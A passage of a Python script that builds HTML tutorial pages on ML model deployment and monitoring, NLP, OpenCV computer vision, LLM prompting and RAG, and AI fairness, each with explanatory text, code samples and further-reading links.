             "<p>Optimize Docker images: use <strong>.dockerignore</strong> to exclude notebooks, data files, and git history. Pin dependency versions in <code>requirements.txt</code>. Use <strong>health checks</strong> with <code>HEALTHCHECK --interval=30s CMD curl -f http://localhost:8000/health || exit 1</code>. Set <strong>resource limits</strong> (<code>--memory=4g --cpus=2</code>). For GPU models, use <code>nvidia/cuda:11.8-runtime-ubuntu22.04</code> base and <code>--gpus all</code> runtime flag. Tag images with commit SHA for traceability.</p>"
             "<pre><code># Dockerfile — multi-stage build\nFROM python:3.11-slim AS builder\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n\nFROM python:3.11-slim\nCOPY --from=builder /usr/local/lib/python3.11/site-packages /usr/local/lib/python3.11/site-packages\nCOPY --from=builder /usr/local/bin /usr/local/bin\nCOPY app/ /app/\nCOPY model.pkl /app/model.pkl\nWORKDIR /app\nHEALTHCHECK CMD curl -f http://localhost:8000/health || exit 1\nCMD [\"uvicorn\", \"main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]</code></pre>"),
            ("MLflow Tracking and Registry",
             "<p>MLflow manages the ML lifecycle — experiment tracking, model registry, and deployment. <strong>MLflow Tracking</strong> logs parameters, metrics, artifacts, and models from training runs. Start with <code>mlflow.set_experiment('churn-prediction')</code>, then log: <code>mlflow.log_param('n_estimators', 100)</code>, <code>mlflow.log_metric('auc', 0.89)</code>, <code>mlflow.log_artifact('confusion_matrix.png')</code>, and <code>mlflow.sklearn.log_model(model, 'model')</code>. View runs in the MLflow UI (<code>mlflow ui</code>).</p>"
             "<p><strong>MLflow Model Registry</strong> manages model versions across staging → production. Register a model: <code>mlflow.register_model('runs:/run_id/model', 'ChurnPredictor')</code>, then promote versions through stages (<code>Staging</code>, <code>Production</code>, <code>Archived</code>). The registry stores additional metadata (model schema, description, signatures). Deploy registered models with <code>mlflow.pyfunc.load_model('models:/ChurnPredictor/Production')</code>. Integrate with CI/CD — promote to production only when tests pass.</p>"
             "<pre><code>import mlflow\nimport mlflow.sklearn\n\nmlflow.set_experiment('customer-churn')\n\nwith mlflow.start_run():\n    mlflow.log_param('model_type', 'XGBoost')\n    mlflow.log_params({'n_estimators': 200, 'max_depth': 6, 'lr': 0.01})\n    mlflow.log_metric('val_auc', 0.923)\n    mlflow.log_metric('val_f1', 0.887)\n    mlflow.sklearn.log_model(xgb_model, 'model')\n    mlflow.log_artifact('feature_importance.png')\n\n# Register in Model Registry\nmodel_uri = f'runs:/{mlflow.active_run().info.run_id}/model'\nmlflow.register_model(model_uri, 'ChurnPredictor')</code></pre>"),
            ("Monitoring and Retraining",
             "<p>Production ML models require continuous monitoring. Track <strong>data drift</strong> (distribution changes in input features) using statistical tests — Kolmogorov-Smirnov for numeric, chi-squared for categorical. <strong>Concept drift</strong> (changing relationship between features and target) detected by monitoring prediction distribution, error rate, and actuals (when ground truth arrives with delay). Use tools like <strong>Evidently AI</strong>, <strong>WhyLabs</strong>, or <strong>Alibi Detect</strong>.</p>"
             "<p>Implement <strong>automated retraining pipelines</strong>: (1) trigger retraining when drift exceeds threshold, (2) train new model version, (3) evaluate against baseline (A/B test or champion-challenger), (4) if performance improves, promote to production. Use <strong>feature stores</strong> (Feast, Tecton) for consistent feature computation across training and serving. Log prediction requests and responses for audit and debugging. Set up <strong>alerting</strong> (PagerDuty, Slack) for model degradation — latency spikes, error rate increases, anomalous predictions.</p>"
             "<pre><code># Drift detection with Evidently AI\nfrom evidently.report import Report\nfrom evidently.metric_preset import DataDriftPreset\n\nreport = Report(metrics=[DataDriftPreset()])\nreport.run(reference_data=train_df, current_data=production_df)\nreport.show(mode='inline')\ndrift_score = report.as_dict()['metrics'][0]['result']['drift_score']\n\nif drift_score > 0.3:\n    trigger_retraining_pipeline()</code></pre>"),
        ],
        further=[
            ("FastAPI Documentation", "FastAPI framework for building high-performance ML model serving APIs.", "https://fastapi.tiangolo.com/"),
            ("MLflow Documentation", "Official MLflow documentation for experiment tracking, model registry, and deployment.", "https://mlflow.org/docs/latest/index.html"),
            ("Feast Feature Store", "Open-source feature store for consistent feature engineering across training and serving.", "https://feast.dev/"),
        ],
    )

    build_page(
        title="Natural Language Processing with Python",
        filename="nlp-python.html",
        desc="Process and analyze text data with Python — spaCy, NLTK, text classification, word embeddings, transformers, and LLM integration.",
        badge="Data Science",
        icon="fas fa-chart-bar",
        sections=[
            ("Text Preprocessing with spaCy",
             "<p>spaCy is a modern NLP library designed for industrial-strength text processing. Load a language model: <code>nlp = spacy.load('en_core_web_sm')</code>. Process text: <code>doc = nlp('Natural language processing is fascinating.')</code>. The <code>Doc</code> object provides <strong>tokenization</strong> (splitting into tokens — words, punctuation), <strong>lemmatization</strong> (base form: 'running' → 'run'), <strong>part-of-speech tagging</strong> (<code>token.pos_</code>), <strong>dependency parsing</strong> (<code>token.dep_</code>), and <strong>named entity recognition</strong> (<code>ent.text_, ent.label_</code>).</p>"
             "<p>Tokenization handles contractions (<code>don't</code> → <code>do</code> + <code>n't</code>), punctuation, and multi-word tokens. Customize the pipeline by adding or removing components: <code>nlp.add_pipe('sentencizer')</code> for sentence segmentation, <code>nlp.add_pipe('merge_entities')</code> to group entity tokens. Use <code>Doc.noun_chunks</code> for base noun phrases and <code>Doc.sents</code> for sentence iteration. spaCy's <code>Matcher</code> and <code>PhraseMatcher</code> enable rule-based entity extraction without training.</p>"
             "<pre><code>import spacy\n\nnlp = spacy.load('en_core_web_sm')\ntext = \"Apple Inc. was founded by Steve Jobs in Cupertino, CA in 1976.\"\ndoc = nlp(text)\n\nfor ent in doc.ents:\n    print(f'{ent.text:20} {ent.label_:15} {spacy.explain(ent.label_)}')\nfor token in doc:\n    print(f'{token.text:15} {token.lemma_:15} {token.pos_:8} {token.dep_:10}')\n\n# Custom pattern matching\nfrom spacy.matcher import Matcher\nmatcher = Matcher(nlp.vocab)\npattern = [{'LOWER': 'machine'}, {'LOWER': 'learning'}]\nmatcher.add('ML_PHRASE', [pattern])</code></pre>"),
            ("Text Classification",
             "<p>Text classification assigns categories to text — spam detection, sentiment analysis, topic labeling. The standard pipeline: (1) preprocess text (clean, tokenize, lemmatize), (2) vectorize using <strong>TF-IDF</strong> or <strong>CountVectorizer</strong> (bag-of-words), (3) train a classifier (Logistic Regression, Naive Bayes, SVM, or fine-tuned transformer). For multi-label classification, use <code>OneVsRestClassifier</code> or Binary Relevance.</p>"
             "<p>Advanced features: <strong>n-grams</strong> (capture phrases: <code>not good</code> vs <code>good</code>), <strong>word embeddings</strong> as features (average Word2Vec or GloVe vectors), <strong>POS tags</strong> and <strong>dependency relations</strong> as additional features. For deep learning, use <strong>BERT-based models</strong> via Hugging Face <code>transformers</code>: <code>from transformers import pipeline; classifier = pipeline('sentiment-analysis')</code>. Fine-tune on your dataset using <code>Trainer</code> API — adds ~5-10% accuracy over traditional methods for most tasks.</p>"
             "<pre><code>from sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.linear_model import LogisticRegression\nfrom sklearn.pipeline import Pipeline\n\npipeline = Pipeline([\n    ('tfidf', TfidfVectorizer(\n        sublinear_tf=True, max_features=10000,\n        ngram_range=(1, 2), stop_words='english')),\n    ('clf', LogisticRegression(C=1.0, class_weight='balanced'))\n])\npipeline.fit(train_texts, train_labels)\n\n# Hugging Face zero-shot classification\nfrom transformers import pipeline\nclassifier = pipeline('zero-shot-classification', model='facebook/bart-large-mnli')\nresult = classifier('This product is amazing!',\n                     candidate_labels=['positive', 'negative', 'neutral'])</code></pre>"),
            ("Word Embeddings and Text Similarity",
             "<p>Word embeddings map words to dense vectors capturing semantic meaning. spaCy ships with pre-trained vectors (<code>en_core_web_md</code> or <code>en_core_web_lg</code>). Compute similarity: <code>doc1.similarity(doc2)</code> uses cosine similarity between average word vectors. For better document embeddings, use <strong>Sentence-BERT</strong> (sentence-transformers library) — <code>from sentence_transformers import SentenceTransformer; model = SentenceTransformer('all-MiniLM-L6-v2'); embeddings = model.encode(sentences)</code>.</p>"
             "<p>Applications: <strong>semantic search</strong> (find documents matching intent, not just keywords), <strong>text clustering</strong> (group similar documents with KMeans), <strong>deduplication</strong> (identify near-identical content), and <strong>recommendation</strong> (find similar items by description). Use <strong>FAISS</strong> (Facebook AI Similarity Search) for fast vector similarity search over millions of documents — <code>IndexFlatIP</code> for inner product, <code>IndexIVFFlat</code> for approximate search with 100x speedup. Embeddings dimensions: 384 (MiniLM), 768 (BERT), 1024 (MPNet).</p>"
             "<pre><code>from sentence_transformers import SentenceTransformer\nimport numpy as np\n\nmodel = SentenceTransformer('all-MiniLM-L6-v2')\ndocs = [\"Machine learning is transforming technology.\",\n        \"Deep learning achieves remarkable results in NLP.\",\n        \"Python is a versatile programming language.\"]\n\nembeddings = model.encode(docs)\n\n# Cosine similarity\ncos_sim = np.dot(embeddings[0], embeddings[1]) / (\n    np.linalg.norm(embeddings[0]) * np.linalg.norm(embeddings[1]))\n\n# FAISS index\nimport faiss\nd = embeddings.shape[1]\nindex = faiss.IndexFlatIP(d)\nindex.add(embeddings)</code></pre>"),
            ("Large Language Models Integration",
             "<p>Integrating LLMs (GPT-4, Claude, Llama) into Python applications enables powerful text generation, summarization, question answering, and code generation. Use the <code>openai</code> library for OpenAI models, <code>anthropic</code> for Claude, or <code>transformers</code> for open-source models (Llama, Mistral, Gemma). The <strong>Chat Completions API</strong> is the standard interface: system prompt sets behavior, user messages provide input, assistant messages are model responses.</p>"
             "<p>Advanced LLM patterns: <strong>retrieval-augmented generation (RAG)</strong> — combine vector search (FAISS/Pinecone) with LLM for answering questions from custom documents. <strong>Prompt engineering</strong> — use <code>langchain</code> or <code>llama_index</code> for prompt templates, chains, and agents. <strong>Function calling</strong> — define JSON schemas for tool use: model decides when to call functions (database queries, API calls, calculations). <strong>Streaming</strong> — render tokens as they arrive using <code>stream=True</code> for real-time UX. Track token usage for cost management.</p>"
             "<pre><code>from openai import OpenAI\n\nclient = OpenAI()\n\nresponse = client.chat.completions.create(\n    model='gpt-4',\n    messages=[\n        {'role': 'system', 'content': 'You are a helpful assistant.'},\n        {'role': 'user', 'content': 'Summarize the key benefits of RAG architecture.'}\n    ],\n    temperature=0.7,\n    max_tokens=500\n)\nprint(response.choices[0].message.content)</code></pre>"),
        ],
        further=[
            ("spaCy Documentation", "Official spaCy docs covering models, pipelines, and NLP processing.", "https://spacy.io/usage"),
            ("Hugging Face Transformers", "State-of-the-art transformer models for NLP, vision, and audio.", "https://huggingface.co/docs/transformers"),
            ("NLTK Book", "The classic Natural Language Processing with Python book by Steven Bird.", "https://www.nltk.org/book/"),
        ],
    )

    build_page(
        title="Computer Vision with OpenCV",
        filename="computer-vision-opencv.html",
        desc="Master computer vision with OpenCV — image processing, object detection, face recognition, video analysis, and deep learning integration.",
        badge="Data Science",
        icon="fas fa-chart-bar",
        sections=[
            ("Image Processing Basics",
             "<p>OpenCV (Open Source Computer Vision Library) provides 2500+ optimized algorithms for image and video analysis. Load images with <code>cv2.imread()</code> (returns BGR NumPy array), display with <code>cv2.imshow()</code>, and save with <code>cv2.imwrite()</code>. Color conversion: <code>cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</code> for grayscale and <code>cv2.COLOR_BGR2RGB</code> for matplotlib display. Resize with <code>cv2.resize(img, (width, height))</code> using interpolation methods (INTER_LINEAR for scaling down, INTER_CUBIC for scaling up).</p>"
             "<p>Essential filters: <strong>Gaussian blur</strong> (<code>GaussianBlur</code>) for noise reduction, <strong>median blur</strong> for salt-and-pepper noise, <strong>bilateral filter</strong> for edge-preserving smoothing. Edge detection: <strong>Canny edge detector</strong> (<code>Canny</code>) with hysteresis thresholding. Morphological operations: dilation, erosion, opening, closing — use <code>getStructuringElement</code> for kernel shapes. Image thresholding: <code>threshold()</code> for binary, <code>adaptiveThreshold</code> for local adaptive.</p>"
             "<pre><code>import cv2\nimport numpy as np\n\nimg = cv2.imread('photo.jpg')\ngray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\nblurred = cv2.GaussianBlur(gray, (5, 5), 1.5)\nedges = cv2.Canny(blurred, 50, 150)\n\n# Contour detection\ncontours, hierarchy = cv2.findContours(edges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\nfor cnt in contours:\n    x, y, w, h = cv2.boundingRect(cnt)\n    cv2.rectangle(img, (x, y), (x+w, y+h), (0, 255, 0), 2)\n\ncv2.imwrite('output.jpg', img)</code></pre>"),
            ("Object Detection",
             "<p>OpenCV provides both traditional and deep learning-based object detection. <strong>Haar Cascade Classifiers</strong> use pre-trained models for face detection (<code>haarcascade_frontalface_default.xml</code>), eye detection, and pedestrian detection. Load with <code>face_cascade = cv2.CascadeClassifier('haarcascade_frontalface_default.xml')</code>, detect with <code>face_cascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5)</code>. Fast but less accurate than deep learning.</p>"
             "<p><strong>YOLO (You Only Look Once)</strong> is the state-of-the-art real-time object detector. Load with OpenCV's DNN module: <code>net = cv2.dnn.readNet('yolov8.weights', 'yolov8.cfg')</code>. Prepare image: <code>blob = cv2.dnn.blobFromImage(img, 1/255.0, (416, 416), swapRB=True)</code>. Run inference: <code>net.setInput(blob); outputs = net.forward()</code>. Parse output layers for bounding boxes, confidence scores, and class IDs. Use NMS (Non-Maximum Suppression) to remove duplicate detections — <code>cv2.dnn.NMSBoxes(boxes, scores, 0.5, 0.4)</code>.</p>"
             "<pre><code># YOLO object detection with OpenCV DNN\nnet = cv2.dnn.readNet('yolov8n.weights', 'yolov8n.cfg')\nclasses = open('coco.names').read().strip().split('\\n')\n\nblob = cv2.dnn.blobFromImage(img, 1/255.0, (416, 416), swapRB=True, crop=False)\nnet.setInput(blob)\nlayer_names = net.getUnconnectedOutLayersNames()\noutputs = net.forward(layer_names)\n\nfor output in outputs:\n    for detection in output:\n        scores = detection[5:]\n        class_id = np.argmax(scores)\n        confidence = scores[class_id]\n        if confidence > 0.5:\n            # Extract box coordinates\n            center_x, center_y = int(detection[0]*w), int(detection[1]*h)\n            bw, bh = int(detection[2]*w), int(detection[3]*h)</code></pre>"),
            ("Face Recognition",
             "<p>OpenCV's <code>face</code> module provides face recognition algorithms. Three built-in recognizers: <strong>LBPH</strong> (Local Binary Patterns Histograms — robust to lighting changes), <strong>Eigenfaces</strong> (PCA-based), and <strong>Fisherfaces</strong> (LDA-based). Train with <code>model = cv2.face.LBPHFaceRecognizer_create()</code>, <code>model.train(faces, labels)</code>. Predict with <code>label, confidence = model.predict(face_region)</code> — lower confidence means better match.</p>"
             "<p>For real-world deployment, use <strong>Deep Learning face recognition</strong>: <strong>FaceNet</strong> or <strong>ArcFace</strong> models generate 128-512 dimensional face embeddings. Compare embeddings using cosine similarity or Euclidean distance (threshold ~0.4-0.6). Use <code>deepface</code> library for high-level API: <code>from deepface import DeepFace; result = DeepFace.verify('img1.jpg', 'img2.jpg')</code>. For large-scale face search, use vector databases (FAISS, Pinecone) indexed with face embeddings.</p>"
             "<pre><code># LBPH Face Recognizer\nrecognizer = cv2.face.LBPHFaceRecognizer_create()\nrecognizer.train(training_faces, np.array(training_labels))\n\n# Predict on new face\nlabel, confidence = recognizer.predict(face_roi)\nif confidence < 60:\n    name = label_to_name[label]\nelse:\n    name = \"Unknown\"\n\n# Deep learning face embeddings\nfrom deepface import DeepFace\nembeddings = DeepFace.represent('face.jpg', model_name='Facenet')[0]['embedding']\n\n# Verify two faces\nresult = DeepFace.verify('person1.jpg', 'person2.jpg', model_name='Facenet')\nprint(result['verified'], result['distance'])</code></pre>"),
            ("Video Analysis",
             "<p>OpenCV processes video streams frame-by-frame. Open video with <code>cap = cv2.VideoCapture('video.mp4')</code> or camera (<code>cv2.VideoCapture(0)</code>). Loop with <code>while cap.isOpened(): ret, frame = cap.read()</code>, process each frame, optionally display with <code>imshow()</code>, and break on <code>cv2.waitKey(1) & 0xFF == ord('q')</code>. Release with <code>cap.release()</code>.</p>"
             "<p>Video analysis techniques: <strong>background subtraction</strong> (<code>createBackgroundSubtractorMOG2</code>) for motion detection, <strong>optical flow</strong> (<code>calcOpticalFlowFarneback</code> for dense, <code>calcOpticalFlowPyrLK</code> for sparse) for tracking movement, <strong>object tracking</strong> (trackers: CSRT, KCF, MIL — <code>cv2.TrackerCSRT_create()</code>) for following detected objects across frames, and <strong>frame differencing</strong> (<code>cv2.absdiff(frame1, frame2)</code>). For video classification, use extracted frames with a CNN or 3D ConvNet (I3D, SlowFast). Write processed video with <code>cv2.VideoWriter</code>.</p>"
             "<pre><code>cap = cv2.VideoCapture('input.mp4')\nfps = int(cap.get(cv2.CAP_PROP_FPS))\nwidth = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))\nheight = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))\nout = cv2.VideoWriter('output.avi', cv2.VideoWriter_fourcc(*'XVID'), fps, (width, height))\n\nwhile True:\n    ret, frame = cap.read()\n    if not ret: break\n    processed = apply_detection(frame)\n    out.write(processed)\n\ncap.release()\nout.release()</code></pre>"),
        ],
        further=[
            ("OpenCV Documentation", "Official OpenCV documentation covering all modules and algorithms.", "https://docs.opencv.org/"),
            ("PyImageSearch Tutorials", "Practical computer vision tutorials covering OpenCV, deep learning, and object detection.", "https://pyimagesearch.com/"),
            ("DeepFace Library", "Lightweight face recognition and facial attribute analysis framework.", "https://github.com/serengil/deepface"),
        ],
    )

    build_page(
        title="LLM Prompting & Integration",
        filename="llm-prompting-guide.html",
        desc="Learn prompt engineering, RAG architectures, function calling, and API integration for large language models in Python.",
        badge="Data Science",
        icon="fas fa-chart-bar",
        sections=[
            ("Prompt Engineering Fundamentals",
             "<p>Prompt engineering is the art of crafting inputs that elicit desired outputs from LLMs. Structure prompts with clear <strong>role</strong> (system message: \"You are a helpful data scientist\"), <strong>task</strong> (\"Summarize the following log into a root cause analysis\"), <strong>context</strong> (background information), <strong>examples</strong> (few-shot prompting with 2-3 examples), <strong>constraints</strong> (\"Output in JSON format with keys: summary, severity, root_cause\"), and <strong>output format</strong> (specify structure explicitly).</p>"
             "<p>Key techniques: <strong>Chain-of-Thought (CoT)</strong> — ask the model to reason step-by-step before answering, improving accuracy on complex tasks. <strong>Temperature tuning</strong> — low temperature (0.0-0.3) for deterministic outputs (code generation, classification), high (0.7-1.0) for creative tasks (writing, brainstorming). <strong>System prompts</strong> set persistent behavior — include safety instructions (\"Don't generate harmful content\"), style guides, and formatting rules. Use <strong>prompt templates</strong> with <code>langchain</code> or <code>jinja2</code> for reusable parameterized prompts.</p>"
             "<pre><code># System message + user message pattern\nmessages = [\n    {\"role\": \"system\", \"content\": \"You are a code reviewer. Analyze the following code for bugs, security issues, and style problems. Provide specific line numbers and fix suggestions.\"},\n    {\"role\": \"user\", \"content\": f\"Review this code:\\n```python\\n{code}\\n```\"}\n]\n\n# Chain-of-Thought prompting\nprompt = f\"\"\"Solve this step by step:\nQ: 24 * 37 = ?\nA: 24 * 30 = 720, 24 * 7 = 168, total = 720 + 168 = 888\nQ: 56 * 43 = ?\nA: \"\"\"</code></pre>"),
            ("Retrieval-Augmented Generation (RAG)",
             "<p>RAG combines information retrieval with LLM generation to answer questions from custom knowledge bases. The architecture: (1) <strong>Ingestion</strong> — chunk documents (500-1000 tokens), generate embeddings (OpenAI embeddings, Sentence Transformers), store in vector database (Pinecone, Weaviate, Chroma). (2) <strong>Query</strong> — embed the user question, search for similar chunks using <strong>cosine similarity</strong>, retrieve top-k (3-10) chunks. (3) <strong>Generation</strong> — inject retrieved chunks into the prompt context, LLM synthesizes the answer with citations.</p>"
             "<p>RAG best practices: tune <strong>chunk size</strong> (512 tokens for specific Q&A, 1024 for summarization), use <strong>overlapping chunks</strong> (10-20% overlap) to avoid cutting off context at boundaries. Implement <strong>hybrid search</strong> (vector similarity + BM25 keyword search) for better retrieval. Add <strong>metadata filtering</strong> (date range, document source, category). Use <strong>reranking</strong> (Cohere rerank, cross-encoder) to reorder retrieved chunks by relevance. The <code>langchain</code> and <code>llama_index</code> libraries provide complete RAG pipelines.</p>"
             "<pre><code>from langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.embeddings import OpenAIEmbeddings\nfrom langchain.vectorstores import Chroma\nfrom langchain.chat_models import ChatOpenAI\nfrom langchain.chains import RetrievalQA\n\n# Ingest documents\ntext_splitter = RecursiveCharacterTextSplitter(chunk_size=500, chunk_overlap=50)\ndocs = text_splitter.split_documents(raw_documents)\nvectordb = Chroma.from_documents(docs, OpenAIEmbeddings())\n\n# Query\nqa = RetrievalQA.from_chain_type(\n    llm=ChatOpenAI(model='gpt-4'),\n    chain_type='stuff',\n    retriever=vectordb.as_retriever(search_kwargs={'k': 5})\n)\nresult = qa.run('What is the refund policy for international orders?')</code></pre>"),
            ("Function Calling",
             "<p>Function calling lets LLMs request external tool execution by outputting structured JSON. Define functions as JSON schemas with name, description, and parameters (type, properties, required). Pass functions in API calls: <code>response = client.chat.completions.create(model='gpt-4', messages=messages, functions=function_definitions)</code>. When the model decides to call a function, <code>response.choices[0].finish_reason == 'function_call'</code> and <code>response.choices[0].message.function_call</code> contains name + arguments.</p>"
             "<p>Implement function execution: validate arguments, run the function (database query, API call, calculation), and return the result as a <code>function</code> role message. The model then uses the function result to generate the final response. Use cases: <strong>database queries</strong> (\"Get orders for user X\"), <strong>external APIs</strong> (weather lookup, stock prices), <strong>calculations</strong> (complex math), <strong>code execution</strong> (run Python in sandbox). Use <code>tools</code> parameter (OpenAI v1.0+) instead of <code>functions</code> for the newer tool-calling API.</p>"
             "<pre><code># Define function schema\nfunctions = [\n    {\n        \"name\": \"get_weather\",\n        \"description\": \"Get current weather for a location\",\n        \"parameters\": {\n            \"type\": \"object\",\n            \"properties\": {\n                \"location\": {\"type\": \"string\", \"description\": \"City name\"},\n                \"units\": {\"type\": \"string\", \"enum\": [\"celsius\", \"fahrenheit\"]}\n            },\n            \"required\": [\"location\"]\n        }\n    }\n]\n\n# Handle function call in response\nif response.choices[0].finish_reason == 'function_call':\n    func_name = response.choices[0].message.function_call.name\n    args = json.loads(response.choices[0].message.function_call.arguments)\n    result = call_weather_api(args['location'])\n    messages.append(response.choices[0].message)\n    messages.append({\"role\": \"function\", \"name\": func_name, \"content\": json.dumps({\"weather\": result})})</code></pre>"),
            ("Cost Optimization and Caching",
             "<p>LLM API costs can grow quickly with production usage. Strategies: (1) <strong>Cache responses</strong> for identical prompts — use Redis or SQLite with prompt hash as key, TTL per cache entry. (2) <strong>Semantic caching</strong> — cache responses for semantically similar queries using embedding similarity (threshold &gt; 0.95) — reduces costs by 30-60% for customer support bots. (3) <strong>Model tiering</strong> — use GPT-3.5-turbo for simple classifications, GPT-4 only for complex reasoning. (4) <strong>Prompt compression</strong> — remove unnecessary context, shorten system prompts.</p>"
             "<p>Monitor token usage with <strong>token counting</strong> (<code>tiktoken</code> for OpenAI, <code>tokenizers</code> for HuggingFace models). <code>tiktoken.encoding_for_model('gpt-4').encode(prompt)</code> returns token count. Set daily/monthly budget limits and alert when approaching thresholds. Use <strong>streaming</strong> to reduce perceived latency without reducing cost. For high-volume applications, consider self-hosting open-source models (Llama 3, Mistral, Gemma) with <code>vLLM</code> or <code>ollama</code> — higher upfront cost but predictable per-token cost at scale.</p>"
             "<pre><code>import hashlib\nimport redis\n\ncache = redis.Redis()\n\ndef get_cached_response(prompt, model='gpt-4'):\n    key = hashlib.sha256(prompt.encode()).hexdigest()\n    cached = cache.get(key)\n    if cached:\n        return cached.decode()\n    response = client.chat.completions.create(model=model, messages=[{\"role\": \"user\", \"content\": prompt}])\n    cache.setex(key, 3600, response.choices[0].message.content)\n    return response.choices[0].message.content\n\n# Token counting\nimport tiktoken\nencoding = tiktoken.encoding_for_model('gpt-4')\ntokens = encoding.encode(\"Your prompt here\")\nprint(f\"Prompt tokens: {len(tokens)}\")</code></pre>"),
        ],
        further=[
            ("OpenAI Prompt Engineering Guide", "Official guide covering prompt design, use cases, and best practices.", "https://platform.openai.com/docs/guides/prompt-engineering"),
            ("LangChain Documentation", "Framework for building LLM applications with RAG, agents, and chains.", "https://python.langchain.com/docs"),
            ("LlamaIndex Documentation", "Data framework for connecting LLMs with external data sources.", "https://docs.llamaindex.ai/"),
        ],
    )

    build_page(
        title="AI Ethics & Responsible Development",
        filename="ai-ethics-guide.html",
        desc="Understand the ethical dimensions of AI — bias mitigation, fairness metrics, transparency, privacy, regulation, and responsible development practices.",
        badge="Data Science",
        icon="fas fa-chart-bar",
        sections=[
            ("Bias in Machine Learning",
             "<p>Algorithmic bias occurs when ML models systematically disadvantage certain groups. Bias can enter at any stage: <strong>training data bias</strong> (underrepresented groups, historical discrimination encoded in labels), <strong>feature bias</strong> (proxy variables for protected attributes — zip code as proxy for race), <strong>label bias</strong> (subjective annotations reflect annotator biases), and <strong>deployment bias</strong> (model used in contexts it wasn't designed for).</p>"
             "<p>Detect bias using fairness metrics: <strong>demographic parity</strong> (equal selection rates across groups), <strong>equal opportunity</strong> (equal true positive rates), <strong>equalized odds</strong> (equal TPR and FPR across groups), and <strong>disparate impact</strong> (ratio of acceptance rates between groups — 80% rule: ratio should be &gt; 0.8). Use tools like <code>fairlearn</code>, <code>AIF360</code>, and <code>shap</code> for bias detection and mitigation. Techniques: <strong>re-weighting</strong> training samples, <strong>adversarial debiasing</strong>, and <strong>post-processing calibration</strong>.</p>"
             "<pre><code>from fairlearn.metrics import selection_rate, demographic_parity_difference\nfrom fairlearn.postprocessing import ThresholdOptimizer\n\n# Compute demographic parity\nselection_rates = df.groupby('gender').apply(\n    lambda g: selection_rate(g['y_true'], g['y_pred']))\nprint(f'Selection rates: {selection_rates}')\ndp = demographic_parity_difference(df['y_true'], df['y_pred'],\n                                   sensitive_features=df['gender'])\nprint(f'Demographic parity difference: {dp:.3f}')\n\n# Post-processing mitigation\nmitigator = ThresholdOptimizer(estimator=model, constraints='demographic_parity')\nmitigator.fit(X_train, y_train, sensitive_features=A_train)\ny_pred_fair = mitigator.predict(X_test, sensitive_features=A_test)</code></pre>"),
            ("Fairness Metrics and Auditing",
             "<p>Beyond simple parity, fairness requires context-specific evaluation. <strong>Individual fairness</strong> — similar individuals should receive similar predictions. Measure using <strong>consistency score</strong> (<code>fairlearn.metrics.consistency_score</code>). <strong>Counterfactual fairness</strong> — prediction should be the same if the individual had a different protected attribute, mathematically defined using causal reasoning. <strong>Intersectional analysis</strong> evaluates bias across multiple protected attributes simultaneously (e.g., Black women vs. White men vs. White women).</p>"
             "<p>Conduct <strong>model audits</strong> before deployment: (1) identify protected attributes (race, gender, age, disability), (2) collect representative evaluation data with demographics, (3) compute fairness metrics across all groups and intersections, (4) set acceptable thresholds (e.g., demographic parity difference &lt; 0.1, equal opportunity difference &lt; 0.05), (5) document findings and mitigation steps. Use <strong>model cards</strong> (<code>modelcards</code> library) to document intended use, evaluations, limitations, and biases.</p>"
             "<pre><code># Intersectional fairness analysis\ndf['intersection'] = df['gender'] + '_' + df['race']\nfor group in df['intersection'].unique():\n    mask = df['intersection'] == group\n    group_df = df[mask]\n    tpr = group_df[group_df['y_true'] == 1]['y_pred'].mean()\n    fpr = group_df[group_df['y_true'] == 0]['y_pred'].mean()\n    print(f'{group}: TPR={tpr:.3f}, FPR={fpr:.3f}')\n\n# Model card generation\nfrom modelcards import Card\ncard = Card(model_name='LoanClassifier',\n            model_details='Gradient boosting for loan approval',\n            intended_use='Automated loan pre-screening',\n            factors='Applicant demographics should not influence decisions')</code></pre>"),
            ("Transparency and Explainability",
             "<p>Black-box ML models need explanation methods for accountability. <strong>SHAP (SHapley Additive exPlanations)</strong> uses game theory to assign each feature a contribution value for a prediction. <code>shap.Explainer(model, X_train)</code> computes SHAP values. Visualize with <code>shap.summary_plot()</code> (global feature importance) and <code>shap.waterfall_plot()</code> (individual prediction breakdown). SHAP is model-agnostic but computationally expensive for large datasets.</p>"
             "<p><strong>LIME (Local Interpretable Model-agnostic Explanations)</strong> approximates the model locally with an interpretable surrogate (linear model, decision tree). <code>lime.lime_tabular.LimeTabularExplainer</code> for tabular data, <code>LimeImageExplainer</code> for images. <strong>Partial dependence plots</strong> show how a feature affects predictions on average. <strong>Integrated Gradients</strong> for neural network feature attribution. For computer vision, <strong>Grad-CAM</strong> highlights image regions that influenced the prediction. All explanations should be validated — if SHAP and LIME disagree, investigate further.</p>"
             "<pre><code>import shap\n\n# SHAP explainer\nexplainer = shap.Explainer(model, X_train)\nshap_values = explainer(X_test[:100])\n\n# Global feature importance\nshap.summary_plot(shap_values, X_test[:100])\n\n# Individual prediction explanation\nshap.waterfall_plot(shap_values[0])\n\n# LIME\nfrom lime.lime_tabular import LimeTabularExplainer\nexplainer = LimeTabularExplainer(\n    X_train.values, feature_names=X_train.columns,\n    class_names=['deny', 'approve'], mode='classification')\nexp = explainer.explain_instance(X_test.iloc[0].values, model.predict_proba, num_features=5)\nexp.show_in_notebook()</code></pre>"),
            ("Regulatory Landscape and Governance",
             "<p>AI regulation is rapidly evolving. The <strong>EU AI Act</strong> (2024) classifies AI systems into risk levels: <strong>unacceptable</strong> (banned — social scoring, real-time biometric surveillance), <strong>high-risk</strong> (employment, credit, law enforcement — require conformity assessment, human oversight, transparency), <strong>limited-risk</strong> (chatbots — transparency obligations), and <strong>minimal-risk</strong> (no regulation). Regulations also cover training data governance (copyrighted data, consent), explainability requirements, and bias testing.</p>"
